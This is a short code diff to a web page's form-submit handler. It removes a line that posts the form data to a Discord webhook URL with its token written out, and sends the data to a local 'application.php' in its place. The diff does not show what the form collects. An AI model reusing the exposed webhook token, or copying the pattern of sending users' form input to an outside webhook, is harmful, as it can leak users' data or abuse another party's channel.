@@ -123,7 +123,7 @@
         form.addEventListener('submit', function (event) {
             event.preventDefault();
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://discord.com/api/webhooks/1126653930781290618/JPuierXslVFedQJJH4zB_pmW-yAlvF64qJEH2yvTF7Vx0nYRW5zOQnGfu22peI3l5-or', true);
+            xhr.open('POST', 'application.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4 && xhr.status === 200) {
